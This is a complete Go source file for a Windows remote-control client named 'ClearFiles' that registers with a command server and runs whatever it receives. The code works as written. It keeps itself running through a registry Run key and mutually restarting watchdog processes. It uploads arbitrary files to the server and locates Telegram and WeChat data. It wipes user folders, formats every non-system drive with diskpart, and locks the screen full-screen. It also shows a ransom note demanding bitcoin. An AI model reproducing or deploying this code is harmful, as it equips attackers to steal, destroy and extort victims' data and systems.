package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

// Configuration
const (
	// In production, use "https://clearpc.zm-tool.me"
	ServerURL     = "http://localhost:8080"
	PollInterval  = 5 * time.Second
	AdminPassword = "admin" // Hardcoded admin password
)

type Device struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

type Command struct {
	ID      string `json:"id"`
	Action  string `json:"action"`
	Payload string `json:"payload"`
}

type CommandLog struct {
	ID       string `json:"id"`
	DeviceID string `json:"device_id"`
	Action   string `json:"action"`
	Result   string `json:"result"`
}

// Global client for reuse
var httpClient *http.Client
var currentDeviceID string

var (
	watchdogMode  = flag.Bool("watchdog", false, "Run in watchdog mode")
	targetPID     = flag.Int("target", 0, "PID to monitor")
	uninstallMode = flag.Bool("uninstall", false, "Run uninstaller")
)

const (
	LockStateFile  = "lock_state.json"
	StopSignalFile = "stop_signal"
)

type LockState struct {
	Locked bool   `json:"locked"`
	Pin    string `json:"pin"`
}

func main() {
	flag.Parse()

	if *uninstallMode {
		handleUninstall()
		return
	}

	if *watchdogMode {
		runWatchdog(*targetPID)
		return
	}

	// Normal mode
	enableAutoStart()

	// Start watchdog to protect this process
	watchdogPID := startWatchdogProcess()

	// Start a goroutine to protect the watchdog (Mutual Monitoring)
	go monitorWatchdog(watchdogPID)

	// Check lock state
	if isLocked, pin := getLockState(); isLocked {
		currentLockPassword = pin
		// Start lock screen in a goroutine
		resumeLockScreen(pin)
	}

	// 1. Gather Info
	hostname, _ := os.Hostname()
	currentDeviceID = generateDeviceID(hostname)

	device := Device{
		ID:       currentDeviceID,
		Hostname: hostname,
		OS:       runtime.GOOS,
	}

	httpClient = &http.Client{
		Timeout: 10 * time.Second,
		// For self-signed certs in dev, use InsecureSkipVerify.
		// In PROD, remove this Transport config to use default secure verification.
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// 2. Register
	if err := register(device); err != nil {
		log.Println("Registration failed:", err)
		// Retry logic could go here
	} else {
		log.Println("Device registered successfully.")
	}

	// 3. Poll Loop
	ticker := time.NewTicker(PollInterval)
	for range ticker.C {
		pollForCommands(device.ID)
		// Heartbeat is redundant as poll updates status
		// sendHeartbeat(device.ID)
	}
}

func generateDeviceID(hostname string) string {
	// Simple ID generation. In production, use hardware UUIDs.
	return fmt.Sprintf("%s-%s", hostname, runtime.GOOS)
}

func register(d Device) error {
	data, _ := json.Marshal(d)
	resp, err := httpClient.Post(ServerURL+"/api/register", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned status: %d", resp.StatusCode)
	}
	return nil
}

func sendHeartbeat(id string) {
	httpClient.Get(ServerURL + "/api/heartbeat?id=" + id)
}

func pollForCommands(id string) {
	resp, err := httpClient.Get(ServerURL + "/api/poll?id=" + id)
	if err != nil {
		log.Println("Poll error:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return // No commands
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println("Error reading response body:", err)
		return
	}

	if resp.StatusCode != http.StatusOK {
		log.Printf("Poll failed with status %d: %s\n", resp.StatusCode, string(body))
		return
	}

	var cmd Command
	if err := json.Unmarshal(body, &cmd); err != nil {
		log.Printf("Error decoding command: %v. Body: %s\n", err, string(body))
		return
	}

	log.Printf("Received command: %s (ID: %s)\n", cmd.Action, cmd.ID)
	executeCommand(cmd)
}

func executeCommand(cmd Command) {
	var result string

	switch cmd.Action {
	case "ping":
		log.Println("Pong!")
		result = "Pong! Client is alive."

	case "info":
		log.Println("Gathering system paths...")
		result = gatherSystemInfo()

	case "wipe_data":
		log.Println("Received wipe_data command. Initiating data wipe...")
		// 警告：启用以下逻辑将永久删除文件！
		// Warning: Enabling the logic below will permanently delete files!
		result = performDataWipe()

	case "format_drives":
		log.Println("Received format_drives command. Initiating drive format...")
		// 警告：启用以下逻辑将格式化非系统盘！
		// Warning: Enabling the logic below will FORMAT non-system drives!
		result = formatNonSystemDrives()

	case "ransom":
		log.Println("Received ransom command. Displaying message...")
		go showRansomNote()
		result = "Ransom note displayed."

	case "list_files":
		log.Println("Listing files...")
		path := cmd.Payload
		if path == "" {
			// Default to user home or current dir
			usr, err := user.Current()
			if err == nil {
				path = usr.HomeDir
			} else {
				path = "."
			}
		}
		result = listFiles(path)

	case "get_file":
		log.Println("Uploading file...")
		path := cmd.Payload
		if path == "" {
			result = "Error: No file path provided"
		} else {
			result = uploadFile(path)
		}

	case "lock_screen":
		log.Println("Locking screen...")
		result = startLockScreen()

	case "unlock_screen":
		log.Println("Unlocking screen...")
		result = stopLockScreen()

	default:
		log.Printf("Unknown command: %s\n", cmd.Action)
		result = fmt.Sprintf("Unknown command: %s", cmd.Action)
	}

	// Report result back to server
	reportResult(cmd, result)
}

func reportResult(cmd Command, result string) {
	logEntry := CommandLog{
		ID:       cmd.ID, // Use command ID to link
		DeviceID: currentDeviceID,
		Action:   cmd.Action,
		Result:   result,
	}

	data, _ := json.Marshal(logEntry)
	resp, err := httpClient.Post(ServerURL+"/api/report", "application/json", bytes.NewBuffer(data))
	if err != nil {
		log.Println("Failed to report result:", err)
		return
	}
	defer resp.Body.Close()
}

func gatherSystemInfo() string {
	usr, err := user.Current()
	if err != nil {
		return "Error getting user info: " + err.Error()
	}

	homeDir := usr.HomeDir
	desktop := filepath.Join(homeDir, "Desktop")
	downloads := filepath.Join(homeDir, "Downloads")

	// Common paths for Telegram/WeChat (Just examples, varies by OS/Install)
	var telegram, wechat string
	if runtime.GOOS == "windows" {
		telegram = filepath.Join(homeDir, "AppData", "Roaming", "Telegram Desktop")
		wechat = filepath.Join(homeDir, "Documents", "WeChat Files")
	} else if runtime.GOOS == "darwin" { // macOS
		telegram = filepath.Join(homeDir, "Library", "Application Support", "Telegram Desktop")
		wechat = filepath.Join(homeDir, "Library", "Containers", "com.tencent.xinWeChat")
	}

	info := fmt.Sprintf(
		"User: %s\nHome: %s\nDesktop: %s\nDownloads: %s\nTelegram (Potential): %s\nWeChat (Potential): %s",
		usr.Username, homeDir, desktop, downloads, telegram, wechat,
	)

	return info
}

func performDataWipe() string {
	usr, err := user.Current()
	if err != nil {
		return "Failed to get user info: " + err.Error()
	}

	homeDir := usr.HomeDir

	// Define targets
	targets := []string{
		filepath.Join(homeDir, "Desktop"),
		filepath.Join(homeDir, "Downloads"),
		filepath.Join(homeDir, "Documents"),
	}

	// Add app-specific paths
	if runtime.GOOS == "windows" {
		targets = append(targets,
			filepath.Join(homeDir, "AppData", "Roaming", "Telegram Desktop"),
			filepath.Join(homeDir, "Documents", "WeChat Files"),
		)
	} else if runtime.GOOS == "darwin" {
		targets = append(targets,
			filepath.Join(homeDir, "Library", "Application Support", "Telegram Desktop"),
			filepath.Join(homeDir, "Library", "Containers", "com.tencent.xinWeChat"),
		)
	}

	var deleted []string
	var failed []string

	for _, path := range targets {
		// Check if exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		// *** DANGER: ACTUAL DELETION ENABLED ***
		// Instead of removing the folder (which might be blocked for Desktop/Documents),
		// we remove the contents.
		entries, err := os.ReadDir(path)
		if err != nil {
			failed = append(failed, fmt.Sprintf("%s (read_err: %v)", filepath.Base(path), err))
			continue
		}

		dirSuccess := true
		for _, entry := range entries {
			fullPath := filepath.Join(path, entry.Name())
			if err := os.RemoveAll(fullPath); err != nil {
				dirSuccess = false
				// Just log the first failure per dir to keep it short?
				// Or just mark dir as failed.
			}
		}

		if dirSuccess {
			deleted = append(deleted, filepath.Base(path))
		} else {
			failed = append(failed, fmt.Sprintf("%s (partial)", filepath.Base(path)))
		}
	}

	return fmt.Sprintf("Wipe sequence completed. Targets: %v. Failed: %v", deleted, failed)
}

func formatNonSystemDrives() string {
	if runtime.GOOS != "windows" {
		return "Format operation only supported on Windows."
	}

	// Check for Admin privileges
	// Simple check: try to open physical drive 0? Or just run a command.
	// We'll rely on command output.

	var formatted []string
	var failed []string

	// Iterate from D: to Z:
	for r := 'D'; r <= 'Z'; r++ {
		drive := string(r) + ":"
		path := drive + "\\"

		// Check if drive exists
		if _, err := os.Stat(path); err == nil {
			log.Printf("[FORMAT] Drive found: %s\n", drive)

			// Use Diskpart which is more reliable than format.com for scripting (avoids label prompt)
			// Script: select volume X \n format fs=ntfs quick label=Wiped
			script := fmt.Sprintf("select volume %s\nformat fs=ntfs quick label=Wiped override\n", drive)
			scriptFile := "diskpart_script.txt"
			os.WriteFile(scriptFile, []byte(script), 0644)

			cmd := exec.Command("diskpart", "/s", scriptFile)
			var out bytes.Buffer
			cmd.Stdout = &out
			cmd.Stderr = &out

			if err := cmd.Run(); err != nil {
				failed = append(failed, fmt.Sprintf("%s (%v, Output: %s)", drive, err, out.String()))
			} else {
				formatted = append(formatted, drive)
			}
			os.Remove(scriptFile)
		}
	}

	if len(formatted) == 0 && len(failed) == 0 {
		return "No non-system drives found."
	}

	return fmt.Sprintf("Format sequence completed. Formatted: %v. Failed: %v", formatted, failed)
}

func startLockScreen() string {
	if runtime.GOOS != "windows" {
		return "Not supported on this OS"
	}
	if lockHwnd != 0 {
		return "Screen is already locked"
	}

	// Generate Random PIN
	n, _ := rand.Int(rand.Reader, big.NewInt(1000000))
	currentLockPassword = fmt.Sprintf("%06d", n.Int64())

	go func() {
		runtime.LockOSThread()
		createLockWindow()
	}()
	saveLockState(true, currentLockPassword)
	return "Screen lock initiated. Unlock PIN: " + currentLockPassword
}

func resumeLockScreen(pin string) {
	if runtime.GOOS != "windows" {
		return
	}
	if lockHwnd != 0 {
		return
	}
	currentLockPassword = pin
	go func() {
		runtime.LockOSThread()
		createLockWindow()
	}()
}

func stopLockScreen() string {
	if runtime.GOOS != "windows" {
		return "Not supported on this OS"
	}
	if lockHwnd == 0 {
		return "Screen is not locked"
	}
	// WM_CLOSE = 0x0010
	// We use PostMessage because the window is on another thread
	user32 := syscall.NewLazyDLL("user32.dll")
	postMessage := user32.NewProc("PostMessageW")
	postMessage.Call(lockHwnd, 0x0010, 0, 0)
	lockHwnd = 0
	saveLockState(false, "")
	return "Screen unlock initiated"
}

func getLockStateConfigPath() string {
	configDir, err := os.UserConfigDir()
	if err != nil {
		return LockStateFile
	}
	appDir := filepath.Join(configDir, "ClearFiles")
	os.MkdirAll(appDir, 0755)
	return filepath.Join(appDir, LockStateFile)
}

func saveLockState(locked bool, pin string) {
	state := LockState{Locked: locked, Pin: pin}
	data, _ := json.Marshal(state)
	os.WriteFile(getLockStateConfigPath(), data, 0644)
}

func getLockState() (bool, string) {
	data, err := os.ReadFile(getLockStateConfigPath())
	if err != nil {
		return false, ""
	}
	var state LockState
	json.Unmarshal(data, &state)
	return state.Locked, state.Pin
}

func enableAutoStart() {
	if runtime.GOOS != "windows" {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return
	}
	defer key.Close()

	// Name: ClearFilesClient
	key.SetStringValue("ClearFilesClient", exePath)
}

func getStopSignalPath() string {
	configDir, err := os.UserConfigDir()
	if err != nil {
		return StopSignalFile
	}
	appDir := filepath.Join(configDir, "ClearFiles")
	return filepath.Join(appDir, StopSignalFile)
}

func checkStopSignal() bool {
	_, err := os.Stat(getStopSignalPath())
	return err == nil
}

func startWatchdogProcess() int {
	exePath, err := os.Executable()
	if err != nil {
		return 0
	}
	pid := os.Getpid()

	cmd := exec.Command(exePath, "-watchdog", fmt.Sprintf("-target=%d", pid))
	// Hide console for watchdog too
	// Since we are compiling with -H=windowsgui, the child should also be gui.
	cmd.Start()
	return cmd.Process.Pid
}

func runWatchdog(pid int) {
	monitorProcess(pid, func() {
		exePath, _ := os.Executable()
		restartProcess(exePath)
	})
}

func monitorWatchdog(pid int) {
	currentPid := pid
	for {
		monitorProcess(currentPid, func() {})

		if checkStopSignal() {
			return
		}
		currentPid = startWatchdogProcess()
		time.Sleep(1 * time.Second)
	}
}

// monitorProcess watches a PID and calls onDeath when it exits
func monitorProcess(pid int, onDeath func()) {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	for {
		// Check for stop signal
		if checkStopSignal() {
			// If stop signal exists, we just exit nicely
			os.Exit(0)
		}

		// Check if target process exists
		const DA_PROCESS_STILL_ACTIVE = 259
		var exitCode uint32
		h, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, uint32(pid))
		if err != nil {
			// Can't open -> likely gone
			onDeath()
			return
		}
		syscall.GetExitCodeProcess(h, &exitCode)
		syscall.CloseHandle(h)

		if exitCode != DA_PROCESS_STILL_ACTIVE {
			// Exited
			onDeath()
			return
		}

		time.Sleep(2 * time.Second)
	}
}

func restartProcess(path string) {
	// Start the main process again
	// The main process will spawn a NEW watchdog.
	// So we (current watchdog) can just exit.
	exec.Command(path).Start()
	os.Exit(0)
}

func handleUninstall() {
	// 1. Prompt for password
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter Admin Password to Uninstall: ")
	password, _ := reader.ReadString('\n')
	password = strings.TrimSpace(password)

	if password != AdminPassword {
		fmt.Println("Incorrect password.")
		return
	}

	fmt.Println("Uninstalling...")

	// 2. Create Stop Signal
	os.WriteFile(getStopSignalPath(), []byte("STOP"), 0644)

	// 3. Remove AutoStart
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err == nil {
		k.DeleteValue("ClearFilesClient")
		k.Close()
	}

	// 4. Remove Lock State
	os.Remove(getLockStateConfigPath())

	// 5. Wait for others to see signal
	fmt.Println("Stopping processes...")
	time.Sleep(3 * time.Second)

	// 6. Kill any remaining instances
	exec.Command("taskkill", "/F", "/IM", filepath.Base(os.Args[0])).Run()

	// 7. Remove Stop Signal
	os.Remove(getStopSignalPath())

	fmt.Println("Uninstalled. You can now delete the file.")
}

var (
	lockHwnd            uintptr
	currentLockPassword string
	hEdit               uintptr
)

func createLockWindow() {
	user32 := syscall.NewLazyDLL("user32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	gdi32 := syscall.NewLazyDLL("gdi32.dll")

	procRegisterClassExW := user32.NewProc("RegisterClassExW")
	procCreateWindowExW := user32.NewProc("CreateWindowExW")
	procGetMessageW := user32.NewProc("GetMessageW")
	procTranslateMessage := user32.NewProc("TranslateMessage")
	procDispatchMessageW := user32.NewProc("DispatchMessageW")
	procGetSystemMetrics := user32.NewProc("GetSystemMetrics")
	procLoadCursor := user32.NewProc("LoadCursorW")

	className, _ := syscall.UTF16PtrFromString("LockScreenClass")
	windowName, _ := syscall.UTF16PtrFromString("Locked")

	// Create callback
	wndProcCallback := syscall.NewCallback(wndProc)

	hInst, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
	// IDC_ARROW = 32512
	hCursor, _, _ := procLoadCursor.Call(0, 32512)
	// BLACK_BRUSH = 4
	hBrush, _, _ := gdi32.NewProc("GetStockObject").Call(4)

	var wc WNDCLASSEX
	wc.CbSize = uint32(unsafe.Sizeof(wc))
	wc.Style = 0
	wc.LpfnWndProc = wndProcCallback
	wc.HInstance = syscall.Handle(hInst)
	wc.HCursor = syscall.Handle(hCursor)
	wc.HbrBackground = syscall.Handle(hBrush)
	wc.LpszClassName = className

	procRegisterClassExW.Call(uintptr(unsafe.Pointer(&wc)))

	screenWidth, _, _ := procGetSystemMetrics.Call(0)  // SM_CXSCREEN
	screenHeight, _, _ := procGetSystemMetrics.Call(1) // SM_CYSCREEN

	// WS_POPUP | WS_VISIBLE = 0x80000000 | 0x10000000
	// WS_EX_TOPMOST = 0x00000008
	hwnd, _, _ := procCreateWindowExW.Call(
		0x00000008, // ExStyle: TOPMOST
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(windowName)),
		0x80000000|0x10000000, // Style
		0, 0, screenWidth, screenHeight,
		0, 0, hInst, 0,
	)

	if hwnd == 0 {
		log.Println("Failed to create lock window")
		return
	}
	lockHwnd = hwnd

	// Create Edit Control for Password
	// WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD | ES_CENTER = 0x40000000 | 0x10000000 | 0x00800000 | 0x0020 | 0x0001
	editClass, _ := syscall.UTF16PtrFromString("EDIT")
	hEdit, _, _ = procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(editClass)),
		0,
		0x40000000|0x10000000|0x00800000|0x0020|0x0001,
		screenWidth/2-100, screenHeight/2+50, 200, 30,
		hwnd, 0, hInst, 0,
	)

	// Set Font for Edit
	fontName, _ := syscall.UTF16PtrFromString("Microsoft YaHei")
	hFont, _, _ := gdi32.NewProc("CreateFontW").Call(
		24, 0, 0, 0, 400, 0, 0, 0, 134, 0, 0, 0, 0, uintptr(unsafe.Pointer(fontName)),
	)
	user32.NewProc("SendMessageW").Call(hEdit, 0x0030, hFont, 1) // WM_SETFONT

	// Create Button
	// WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON = 0x40000000 | 0x10000000 | 0x0000
	btnClass, _ := syscall.UTF16PtrFromString("BUTTON")
	btnText, _ := syscall.UTF16PtrFromString("Unlock")
	// ID_BUTTON = 101
	hBtn, _, _ := procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(btnClass)),
		uintptr(unsafe.Pointer(btnText)),
		0x40000000|0x10000000,
		screenWidth/2-50, screenHeight/2+100, 100, 40,
		hwnd, 101, hInst, 0,
	)
	user32.NewProc("SendMessageW").Call(hBtn, 0x0030, hFont, 1) // WM_SETFONT

	// Force Focus to Edit
	user32.NewProc("SetFocus").Call(hEdit)

	var msg MSG
	for {
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 { // WM_QUIT
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessageW.Call(uintptr(unsafe.Pointer(&msg)))
	}
	lockHwnd = 0
}

func wndProc(hwnd uintptr, msg uintptr, wParam, lParam uintptr) uintptr {
	user32 := syscall.NewLazyDLL("user32.dll")

	switch uint32(msg) {
	case 0x0010: // WM_CLOSE
		user32.NewProc("DestroyWindow").Call(hwnd)
		return 0
	case 0x0002: // WM_DESTROY
		user32.NewProc("PostQuitMessage").Call(0)
		return 0
	case 0x000F: // WM_PAINT
		drawLockText(hwnd)
		return 0
	case 0x0111: // WM_COMMAND
		// Check if Button Clicked (ID 101)
		if (wParam & 0xFFFF) == 101 {
			// Get Text from Edit
			buf := make([]uint16, 256)
			user32.NewProc("GetWindowTextW").Call(hEdit, uintptr(unsafe.Pointer(&buf[0])), 256)
			input := syscall.UTF16ToString(buf)

			if input == currentLockPassword || input == AdminPassword {
				user32.NewProc("DestroyWindow").Call(hwnd)
				saveLockState(false, "")
			} else {
				// Show Error
				msgText, _ := syscall.UTF16PtrFromString("Incorrect Password")
				title, _ := syscall.UTF16PtrFromString("Error")
				user32.NewProc("MessageBoxW").Call(hwnd, uintptr(unsafe.Pointer(msgText)), uintptr(unsafe.Pointer(title)), 0x10) // MB_ICONERROR

				// Clear Input
				user32.NewProc("SetWindowTextW").Call(hEdit, 0)
			}
		}
		return 0
	case 0x0112: // WM_SYSCOMMAND
		if (wParam & 0xFFF0) == 0xF060 { // SC_CLOSE
			return 0
		}
	}

	defWindowProc, _, _ := user32.NewProc("DefWindowProcW").Call(hwnd, uintptr(msg), wParam, lParam)
	return defWindowProc
}

func drawLockText(hwnd uintptr) {
	user32 := syscall.NewLazyDLL("user32.dll")
	gdi32 := syscall.NewLazyDLL("gdi32.dll")

	var ps PAINTSTRUCT
	hdc, _, _ := user32.NewProc("BeginPaint").Call(hwnd, uintptr(unsafe.Pointer(&ps)))

	// Set text color white, bg black
	gdi32.NewProc("SetTextColor").Call(hdc, 0x00FFFFFF)
	gdi32.NewProc("SetBkMode").Call(hdc, 1) // TRANSPARENT

	rect := RECT{0, 0, 1920, 1080} // Initial guess, updated by GetClientRect
	user32.NewProc("GetClientRect").Call(hwnd, uintptr(unsafe.Pointer(&rect)))

	text, _ := syscall.UTF16PtrFromString("此电脑已被管理员锁定 / THIS COMPUTER IS LOCKED")
	fontName, _ := syscall.UTF16PtrFromString("Microsoft YaHei")

	// Create a larger font
	hFont, _, _ := gdi32.NewProc("CreateFontW").Call(
		48, 0, 0, 0, 700, 0, 0, 0, 134, 0, 0, 0, 0, uintptr(unsafe.Pointer(fontName)),
	)
	oldFont, _, _ := gdi32.NewProc("SelectObject").Call(hdc, hFont)

	// DT_CENTER | DT_VCENTER | DT_SINGLELINE = 0x1 | 0x4 | 0x20
	user32.NewProc("DrawTextW").Call(hdc, uintptr(unsafe.Pointer(text)), ^uintptr(0), uintptr(unsafe.Pointer(&rect)), 0x1|0x4|0x20)

	gdi32.NewProc("SelectObject").Call(hdc, oldFont)
	gdi32.NewProc("DeleteObject").Call(hFont)
	user32.NewProc("EndPaint").Call(hwnd, uintptr(unsafe.Pointer(&ps)))
}

type WNDCLASSEX struct {
	CbSize        uint32
	Style         uint32
	LpfnWndProc   uintptr
	CbClsExtra    int32
	CbWndExtra    int32
	HInstance     syscall.Handle
	HIcon         syscall.Handle
	HCursor       syscall.Handle
	HbrBackground syscall.Handle
	LpszMenuName  *uint16
	LpszClassName *uint16
	HIconSm       syscall.Handle
}

type MSG struct {
	Hwnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

type POINT struct {
	X, Y int32
}

type RECT struct {
	Left, Top, Right, Bottom int32
}

type PAINTSTRUCT struct {
	Hdc         syscall.Handle
	FErase      int32
	RcPaint     RECT
	FRestore    int32
	FIncUpdate  int32
	RgbReserved [32]byte
}

type FileInfo struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	Size    int64  `json:"size"`
	IsDir   bool   `json:"is_dir"`
	ModTime string `json:"mod_time"`
}

func listFiles(path string) string {
	// If path is ".", use user home directory
	if path == "." {
		usr, err := user.Current()
		if err == nil {
			path = usr.HomeDir
		}
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("Error reading directory %s: %v", path, err)
	}

	var files []FileInfo
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		files = append(files, FileInfo{
			Name:    entry.Name(),
			Path:    filepath.Join(path, entry.Name()),
			Size:    info.Size(),
			IsDir:   entry.IsDir(),
			ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
		})
	}

	jsonData, err := json.Marshal(files)
	if err != nil {
		return fmt.Sprintf("Error encoding file list: %v", err)
	}
	return string(jsonData)
}

func uploadFile(path string) string {
	file, err := os.Open(path)
	if err != nil {
		return fmt.Sprintf("Error opening file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		return fmt.Sprintf("Error creating form file: %v", err)
	}
	if _, err := io.Copy(part, file); err != nil {
		return fmt.Sprintf("Error copying file content: %v", err)
	}

	// Add device_id field
	writer.WriteField("device_id", currentDeviceID)

	if err := writer.Close(); err != nil {
		return fmt.Sprintf("Error closing writer: %v", err)
	}

	req, err := http.NewRequest("POST", ServerURL+"/api/upload", body)
	if err != nil {
		return fmt.Sprintf("Error creating request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Reuse existing httpClient
	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Sprintf("Error uploading file: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Sprintf("Server returned status: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	// Return the URL where the file can be accessed
	// URL would be {ServerURL}/uploads/{device_id}/{filename}
	url := fmt.Sprintf("%s/uploads/%s/%s", ServerURL, currentDeviceID, filepath.Base(path))
	return fmt.Sprintf("Upload successful: %s", url)
}

func showRansomNote() {
	if runtime.GOOS != "windows" {
		return
	}

	user32 := syscall.NewLazyDLL("user32.dll")
	procMessageBox := user32.NewProc("MessageBoxW")

	title, _ := syscall.UTF16PtrFromString("系统已锁定")
	message, _ := syscall.UTF16PtrFromString("您的电脑已被锁定！\n请支付 1 BTC 到以下地址以解锁：\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n(联系管理员获取密码)")

	// 0x00000030 = MB_ICONEXCLAMATION
	// 0x00001000 = MB_SYSTEMMODAL (Topmost)
	procMessageBox.Call(
		0,
		uintptr(unsafe.Pointer(message)),
		uintptr(unsafe.Pointer(title)),
		0x00000030|0x00001000,
	)
}
